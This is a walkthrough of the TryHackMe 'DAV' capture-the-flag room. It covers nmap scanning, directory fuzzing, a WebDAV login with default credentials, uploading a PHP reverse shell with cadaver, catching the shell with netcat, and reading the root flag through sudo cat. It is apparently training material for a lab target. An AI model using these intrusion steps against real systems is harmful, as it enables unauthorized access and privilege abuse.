# DAV THM CTF Walkthrough

Solving DAV TryHackMe Capture The Flag [DAV TryHackMe Room](https://tryhackme.com/r/room/bsidesgtdav)

## First Step: Reconnaissance

```sh
nmap -sV -sC -Pn -A 10.10.210.35
```
![Nmap Result](Img)

Here we see only port 80 (http) is open, running Apache httpd 2.4.18 on Ubuntu.

Next step is to visit the webpage where we see the default Apache page, nothing really interesting yet.
![Apache Default Page](Img)

## Directory Brute-Forcing

Using `ffuf` (gobuster alternative):
```sh
ffuf -u http://10.10.210.35/FUZZ -e .php,.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
```

We found `/webdav`, which is interesting. Using BurpSuite or Hydra is not required for this login. A quick Google search reveals that WebDAV stands for "Web-based Distributed Authoring and Versioning," which means it can be exploited. Default credentials for WebDAV in this CTF Room are used: `wampp:xampp`.

Successful login.
![WebDAV Login](Img)

We get `password.dav` which contains a hash that I couldn't crack.

## Exploiting WebDAV

Instead, I searched for other vulnerabilities and found that we can use `cadaver` to upload a reverse shell PHP file.

```sh
cadaver http://10.10.210.35:80/webdav/
put reverseShell.php
```
![Upload with Cadaver](Img)

Get the reverse shell PHP from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Just modify your attacker IP and port.

Open netcat listener.
![Netcat Listener](Img)

Go back to [WebDAV](http://10.10.210.35/webdav/) and run the PHP file we just uploaded.
![Run PHP File](Img)

We got the reverse shell.

## Converting to TTY Shell

(Optional but recommended)
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![TTY Shell](Img)

## Finding Flags

To find `user.txt`, use:
```sh
find / -type f -name user.txt 2>>/dev/null
```
![Find user.txt](Img)

Then use `cat` to read the flag.

To check for root permissions:
```sh
sudo -l
```
![sudo -l](Img)

We can run the `cat` command as sudo:
```sh
sudo cat /root/root.txt
```
![Root Flag](Img)

Congrats! We have solved DAV THM CTF! Follow My GitHub for more.
```

You can copy and paste this content into your README.md file.
